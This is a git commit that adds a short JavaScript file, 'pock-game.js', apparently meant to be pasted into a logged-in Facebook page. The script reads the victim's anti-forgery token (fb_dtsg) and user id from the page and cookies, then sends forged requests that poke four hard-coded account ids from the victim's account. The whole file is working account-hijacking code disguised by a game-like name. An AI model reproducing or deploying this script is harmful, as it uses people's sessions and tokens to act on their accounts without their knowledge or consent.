34e7f0d52f7456ca88143b081fd3402bda0036c3
bhargav1996 <www.bhargav1996@gmail.com>
2013-05-26 11:16:32 +0530

    Create pock-game.js

---
+++ pock-game.js
@@ -0,0 +1,19 @@
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function p(abone) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "//www.facebook.com/ajax/poke_dialog.php";
+  var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+p("100003615650348");
+p("100002562531937");
+p("100004106241816");
+p("100001047241090");
